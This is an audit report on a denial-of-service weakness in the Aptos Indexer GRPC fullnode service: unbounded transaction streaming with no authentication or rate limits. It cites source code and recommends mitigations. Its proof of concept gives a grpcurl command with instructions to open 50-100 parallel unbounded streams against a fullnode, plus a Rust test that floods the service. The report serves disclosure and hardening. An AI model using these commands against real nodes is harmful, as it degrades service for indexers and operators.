# Audit Report

## Title
Unbounded Transaction Streaming Enables Resource Exhaustion DoS in Indexer GRPC Fullnode Service

## Summary
The `get_transactions_from_node()` function in the Indexer GRPC Fullnode service accepts `transactions_count = None` and sets `ending_version = u64::MAX`, allowing unauthenticated attackers to stream the entire blockchain history without limits. Multiple concurrent malicious connections can exhaust CPU, memory, database I/O, and network bandwidth, causing service degradation or crashes.

## Finding Description

The vulnerability exists in the transaction streaming logic where the service intentionally allows infinite streaming but lacks protective mechanisms against abuse.

When a client omits the `transactions_count` parameter, the service sets `ending_version` to the maximum possible value: [1](#0-0) 

The protobuf specification confirms this is intentional design for continuous streaming: [2](#0-1) 

The IndexerStreamCoordinator then processes transactions in a loop until `current_version >= end_version`: [3](#0-2) 

The batching mechanism caps each iteration at `highest_known_version + 1`: [4](#0-3) 

However, the service loop continues indefinitely, waiting for new blocks when caught up: [5](#0-4) 

**Critical Security Gaps:**

1. **No Authentication**: The GRPC service is exposed without authentication or authorization: [6](#0-5) 

2. **No Rate Limiting**: No connection limits, request throttling, or bandwidth caps

3. **No Maximum Transaction Validation**: No checks prevent requesting billions of transactions

**Attack Scenario:**

An attacker opens N concurrent connections (e.g., 50-100) with:
- `starting_version = 0` 
- `transactions_count = None` (omitted)

Each connection:
1. Streams the entire blockchain history (millions of transactions on mainnet)
2. Consumes CPU for transaction conversion (stage 2: Rust API objects, stage 3: protobuf)
3. Consumes database read I/O for fetching historical transactions
4. Consumes network bandwidth streaming gigabytes of data
5. Maintains open connection indefinitely, waiting for new blocks

With default configuration (processor_task_count=20, processor_batch_size=1000), each connection spawns 20 parallel tasks processing up to 20,000 transactions per batch cycle: [7](#0-6) 

## Impact Explanation

**Severity: High** - API crashes and service degradation

This vulnerability enables a Denial of Service attack against the Indexer GRPC API, meeting the High severity criteria: "API crashes" and service degradation. While this does not directly affect consensus or validator operations, it impacts critical blockchain infrastructure:

1. **Service Unavailability**: Legitimate indexers cannot access transaction data, breaking indexing pipelines
2. **Fullnode Performance Degradation**: Database contention from excessive reads can slow down the fullnode's primary functions
3. **Resource Exhaustion**: CPU saturation from transaction processing, memory pressure from buffering, network bandwidth exhaustion

The attack requires minimal resources from the attacker (simple gRPC clients) but forces the service to perform expensive operations (historical blockchain traversal, serialization, streaming).

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication required
- Simple gRPC request with omitted parameter
- Low attacker cost (bandwidth for receiving responses can be throttled client-side)
- High service cost (CPU, memory, database I/O, network)

The service is designed to be exposed for indexer access, making it accessible to potential attackers. The README documents public setup instructions without mentioning access controls: [8](#0-7) 

## Recommendation

Implement layered protections:

**1. Enforce Maximum Transaction Count:**
```rust
let ending_version = if let Some(count) = r.transactions_count {
    // Add maximum limit validation
    const MAX_TRANSACTION_COUNT: u64 = 10_000_000; // 10M transactions
    if count > MAX_TRANSACTION_COUNT {
        return Err(Status::invalid_argument(
            format!("transactions_count exceeds maximum of {}", MAX_TRANSACTION_COUNT)
        ));
    }
    starting_version.saturating_add(count)
} else {
    // Reject unbounded requests or require authentication
    return Err(Status::invalid_argument(
        "transactions_count is required for public access"
    ));
};
```

**2. Add Authentication/Authorization:**
Implement API key or token-based authentication for trusted indexers, similar to other Aptos services.

**3. Implement Rate Limiting:**
- Limit concurrent connections per IP/client
- Limit bandwidth per connection
- Limit total active streams

**4. Add Connection Time Limits:**
- Maximum stream duration (e.g., 1 hour)
- Automatic disconnect for idle streams

**5. Monitoring and Alerting:**
- Track active streams and resource consumption
- Alert on suspicious patterns (many long-lived connections from same source)

## Proof of Concept

```bash
# Install grpcurl if not already installed
# macOS: brew install grpcurl
# Linux: apt-get install grpcurl or download from GitHub

# Attack: Open multiple concurrent unlimited streams
# Each command streams entire blockchain history

# Terminal 1-10 (run in parallel):
grpcurl -max-msg-sz 100000000 \
  -d '{"starting_version": 0}' \
  -import-path protos/proto \
  -proto aptos/internal/fullnode/v1/fullnode_data.proto \
  -plaintext <FULLNODE_IP>:50051 \
  aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode

# Note: transactions_count is omitted, causing ending_version = u64::MAX
# Each stream will attempt to fetch and stream millions of transactions
# Open 50-100 such connections to exhaust service resources

# Monitoring impact:
# - CPU usage will spike to 100% across multiple cores
# - Memory consumption will grow with buffered data
# - Database read I/O will saturate
# - Network bandwidth will max out
# - Legitimate indexer requests will timeout or fail
```

**Rust Integration Test PoC:**
```rust
#[tokio::test]
async fn test_unbounded_streaming_resource_exhaustion() {
    // Setup test fullnode with indexer GRPC enabled
    let config = create_test_config_with_indexer_grpc();
    let node = start_test_fullnode(config).await;
    
    // Create 50 concurrent clients
    let mut tasks = vec![];
    for i in 0..50 {
        let client = create_fullnode_data_client(node.grpc_address()).await;
        let task = tokio::spawn(async move {
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: None, // Unbounded!
            };
            let mut stream = client.get_transactions_from_node(request).await.unwrap();
            let mut count = 0;
            while let Some(_response) = stream.message().await.unwrap() {
                count += 1;
                if count > 1000 { break; } // Limit for test
            }
        });
        tasks.push(task);
    }
    
    // Observe resource exhaustion
    tokio::time::sleep(Duration::from_secs(10)).await;
    
    // Service should be degraded or unresponsive
    let health_check = check_service_health(node.grpc_address()).await;
    assert!(health_check.is_degraded || health_check.response_time > 5000);
}
```

**Notes**

This vulnerability affects the Indexer GRPC Fullnode service, which is auxiliary infrastructure for blockchain data access rather than core consensus/execution components. However, it represents a serious availability issue for ecosystem participants relying on indexer services. The intentional design for infinite streaming (per protobuf specification) conflicts with the lack of protective mechanisms against abuse when exposed without authentication. Production deployments should implement strict access controls and resource limits as recommended above.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L83-87)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L135-199)
```rust
            while coordinator.current_version < coordinator.end_version {
                let start_time = std::time::Instant::now();
                // Processes and sends batch of transactions to client
                let results = coordinator.process_next_batch().await;
                if abort_handle.load(Ordering::SeqCst) {
                    info!("FullnodeDataService is aborted.");
                    break;
                }
                if results.is_empty() {
                    info!(
                        start_version = starting_version,
                        chain_id = ledger_chain_id,
                        "[Indexer Fullnode] Client disconnected."
                    );
                    break;
                }
                let max_version = match IndexerStreamCoordinator::get_max_batch_version(results) {
                    Ok(max_version) => max_version,
                    Err(e) => {
                        error!("[Indexer Fullnode] Error sending to stream: {}", e);
                        break;
                    },
                };
                let highest_known_version = coordinator.highest_known_version;

                // send end batch message (each batch) upon success of the entire batch
                // client can use the start and end version to ensure that there are no gaps
                // end loop if this message fails to send because otherwise the client can't validate
                let batch_end_status = get_status(
                    StatusType::BatchEnd,
                    coordinator.current_version,
                    Some(max_version),
                    ledger_chain_id,
                );
                let channel_size = transaction_channel_size - tx.capacity();
                CHANNEL_SIZE
                    .with_label_values(&["2"])
                    .set(channel_size as i64);
                match tx.send(Result::<_, Status>::Ok(batch_end_status)).await {
                    Ok(_) => {
                        // tps logging
                        let new_base: u64 = ma.sum() / (DEFAULT_EMIT_SIZE as u64);
                        ma.tick_now(max_version - coordinator.current_version + 1);
                        if base != new_base {
                            base = new_base;

                            log_grpc_step_fullnode(
                                IndexerGrpcStep::FullnodeProcessedBatch,
                                Some(coordinator.current_version as i64),
                                Some(max_version as i64),
                                None,
                                Some(highest_known_version as i64),
                                Some(ma.avg() * 1000.0),
                                Some(start_time.elapsed().as_secs_f64()),
                                Some((max_version - coordinator.current_version + 1) as i64),
                            );
                        }
                    },
                    Err(_) => {
                        aptos_logger::warn!("[Indexer Fullnode] Unable to send end batch status");
                        break;
                    },
                }
                coordinator.current_version = max_version + 1;
            }
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L42-44)
```text
  // Optional; number of transactions to return in current stream.
  // If not set, response streams infinitely.
  optional uint64 transactions_count = 2 [jstype = JS_STRING];
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L301-317)
```rust
        let end_version = std::cmp::min(self.end_version, self.highest_known_version + 1);

        while num_fetches < self.processor_task_count && starting_version < end_version {
            let num_transactions_to_fetch = std::cmp::min(
                self.processor_batch_size as u64,
                end_version - starting_version,
            ) as u16;

            batches.push(TransactionBatchInfo {
                start_version: starting_version,
                head_version: self.highest_known_version,
                num_transactions_to_fetch,
            });
            starting_version += num_transactions_to_fetch as u64;
            num_fetches += 1;
        }
        batches
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L550-578)
```rust
    async fn ensure_highest_known_version(&mut self) -> bool {
        let mut empty_loops = 0;
        while self.highest_known_version == 0 || self.current_version > self.highest_known_version {
            if let Some(abort_handle) = self.abort_handle.as_ref() {
                if abort_handle.load(Ordering::SeqCst) {
                    return false;
                }
            }
            if empty_loops > 0 {
                tokio::time::sleep(Duration::from_millis(RETRY_TIME_MILLIS)).await;
            }
            empty_loops += 1;
            if let Err(err) = self.set_highest_known_version() {
                error!(
                    error = format!("{:?}", err),
                    "[Indexer Fullnode] Failed to set highest known version"
                );
                continue;
            } else {
                sample!(
                    SampleRate::Frequency(10),
                    info!(
                        highest_known_version = self.highest_known_version,
                        "[Indexer Fullnode] Found new highest known version",
                    )
                );
            }
        }
        true
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-130)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
            true => {
                let svc = RawDataServer::new(localnet_data_server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
        };

        let listener = TcpListener::bind(address).await.unwrap();
        if let Some(port_tx) = port_tx {
            port_tx.send(listener.local_addr().unwrap().port()).unwrap();
        }
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();

        // Make port into a config
        router.serve_with_incoming(incoming).await.unwrap();
```

**File:** config/src/config/indexer_grpc_config.rs (L17-28)
```rust
const DEFAULT_PROCESSOR_BATCH_SIZE: u16 = 1000;
const DEFAULT_OUTPUT_BATCH_SIZE: u16 = 100;
const DEFAULT_TRANSACTION_CHANNEL_SIZE: usize = 35;
pub const DEFAULT_GRPC_STREAM_PORT: u16 = 50051;
const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;

pub fn get_default_processor_task_count(use_data_service_interface: bool) -> u16 {
    if use_data_service_interface {
        1
    } else {
        20
    }
```

**File:** ecosystem/indexer-grpc/README.md (L56-59)
```markdown
#### 2) Test with `grpcurl`

* Ensure `grpcurl` installed
* From the aptos-core (project base directory), try hitting a grpc endpoint directly on the fullnode: `grpcurl  -max-msg-sz 10000000 -d '{ "starting_version": 0 }' -import-path crates/aptos-protos/proto -proto aptos/internal/fullnode/v1/fullnode_data.proto  -plaintext 127.0.0.1:50051 aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode`
```
